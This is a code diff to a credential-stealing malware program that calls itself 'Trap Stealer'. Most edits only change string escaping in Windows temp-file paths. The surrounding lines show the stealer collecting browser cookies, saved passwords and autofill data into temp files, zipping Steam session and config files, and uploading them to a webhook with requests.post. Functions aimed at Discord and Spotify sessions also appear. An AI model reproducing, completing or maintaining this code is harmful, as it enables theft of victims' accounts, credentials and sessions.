@@ -817,7 +817,7 @@ Autofill = []
 
 
 def writeforfile(data, name):
-    path = os.getenv("TEMP") + f"\wp{name}.txt"
+    path = os.getenv("TEMP") + fr"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
         f.write(f"Trap Stealer\n\n")
         for line in data:
@@ -890,7 +890,7 @@ def UserInfo():
             'tasklist'
         ]
 
-        output_file_path = os.getenv("TEMP") + f"\winguid.txt"
+        output_file_path = os.getenv("TEMP") + fr"\winguid.txt"
 
         with open(output_file_path, 'w') as f:
             f.write('')
@@ -1855,7 +1855,7 @@ def steam_st():
                 for file2 in path1:
                     steam_session.write(file2)
             if os.path.exists(steam_path+"\\config"):
-                with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
+                with zipfile.ZipFile(f"{os.environ['TEMP']}\\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
                     steam(steam_path+"\\config",ssfn,zp)
 
                 headers = {
@@ -1873,7 +1873,7 @@ def steam_st():
             response = requests.post(webhook, files=file, data=data)
             try:
 
-                os.remove(f"{os.environ['TEMP']}\steam_session.zip")
+                os.remove(f"{os.environ['TEMP']}\\steam_session.zip")
 
             except:
                 pass
@@ -2224,13 +2224,12 @@ def srcs():
     except Exception as e:
         pass
 url_dict = {}
-   
 data = []
 def paaz(filetype):
     temp = []
     if filetype == 'cook':
         try:
-            file = os.getenv("TEMP") + f"\wpcook.txt"
+            file = os.getenv("TEMP") + fr"\wpcook.txt"
             filename = "wpcook.txt"
         except:
             file = "Couldn't get cookies"
@@ -2246,7 +2245,7 @@ def paaz(filetype):
 
     if filetype == 'passw':
         try:
-            file2 = os.getenv("TEMP") + f"\wppassw.txt"
+            file2 = os.getenv("TEMP") + fr"\wppassw.txt"
             filename2 = "wppassw.txt"
         except:
             file2 = "Couldn't get passwords"
@@ -2257,7 +2256,7 @@ def paaz(filetype):
 
     if filetype == 'autof':
         try:
-            file3 = os.getenv("TEMP") + f"\wpautofill.txt"
+            file3 = os.getenv("TEMP") + fr"\wpautofill.txt"
             filename3 = "wpautofill.txt"
         except:
             file3 = "Couldn't get autofill"
@@ -2268,7 +2267,7 @@ def paaz(filetype):
         
     if filetype == 'uploooad':
         try:
-            with open(os.getenv("TEMP") + f"\wpcook.txt", 'r') as fp:
+            with open(os.getenv("TEMP") + fr"\wpcook.txt", 'r') as fp:
                 CookiCount = sum(1 for line in fp)
         except:
             CookiCount = 'error'
@@ -2306,9 +2305,9 @@ def paaz(filetype):
         for thread in temp:
             thread.join()
         try:
-            file = os.getenv("TEMP") + f"\wpcook.txt"
-            file2 = os.getenv("TEMP") + f"\wppassw.txt"
-            file3 = os.getenv("TEMP") + f"\wpautofill.txt"
+            file = os.getenv("TEMP") + fr"\wpcook.txt"
+            file2 = os.getenv("TEMP") + fr"\wppassw.txt"
+            file3 = os.getenv("TEMP") + fr"\wpautofill.txt"
             file4 = os.getenv("TEMP") + '\winvs.txt'
             file5 = os.getenv("TEMP") + '\winvs.txt'
             ss = [file,file5,file2,file3,file4]
@@ -2346,7 +2345,7 @@ def frcook():
                             Cookies.append(f"Host Key: {row[4]} | Name : {row[2]} | Value : {row[3]}")
                             CookiCount += 1
                             
-                    file3 = os.getenv("TEMP") + f"\wpcook.txt"
+                    file3 = os.getenv("TEMP") + fr"\wpcook.txt"
                     with open(file3, 'a') as f:
                         f.write(Cookies)
                             
@@ -2963,7 +2962,7 @@ def spotify(cookie):
     
 def cokssite():
     try:
-        Cookies = os.getenv("TEMP") + f"\wpcook.txt"
+        Cookies = os.getenv("TEMP") + fr"\wpcook.txt"
         with open(Cookies, 'r') as f:
             lines = f.readlines()
             l = []
@@ -3327,8 +3326,7 @@ def gatha():
             DiscordStop = False
         except:
             pass
-
-    
+            
     if DiscordStop == True:
         try:
             no = threading.Thread(target=NoDiscord)
